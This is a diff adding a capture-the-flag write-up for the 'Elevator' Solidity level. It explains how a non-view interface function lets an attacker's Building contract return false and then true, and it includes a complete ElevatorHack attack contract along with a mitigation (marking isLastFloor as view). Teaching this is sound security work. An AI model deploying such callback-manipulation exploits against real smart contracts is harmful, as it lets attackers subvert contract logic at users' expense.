@@ -1,0 +1,60 @@
+---
+title: Level 11 - Elevator
+slug: level-11
+published: 05-17-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Make the elevator go to the top floor. (Give the `floor` variable the same value as the `top` variable)
+
+## Vulnerabilities
+
+### Interface function not using pure or view
+
+Functions in interfaces that are not `pure` or `view` can be used to modify state in an unintended way. In this level,
+we use this to make the function `isLastFloor` return different values based on some state.
+
+## Exploit
+
+1. Write and deploy an attack contract like this:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "Elevator.sol";
+
+contract ElevatorHack is Building  {
+    Elevator target;
+    bool alreadyCalled;
+
+    constructor(address _targetAddress) {
+        target = Elevator(_targetAddress);
+    }
+
+    function isLastFloor(uint) override external returns(bool){
+        if(alreadyCalled){
+            return true;
+        } else {
+            alreadyCalled = true;
+            return false;
+        }
+    }
+
+    function attack(uint _floor) external {
+        target.goTo(_floor);
+    }
+}
+```
+
+2. Call the `attack` function with and uint as argument to reach the top floor.
+
+## Suggested mitigation
+
+1. Add the `view` modifier to the `isLastFloor` interface function.
+
+## Further reading
+
+- View functions <ExternalLink href={"https://docs.soliditylang.org/en/develop/contracts.html#view-functions"} />
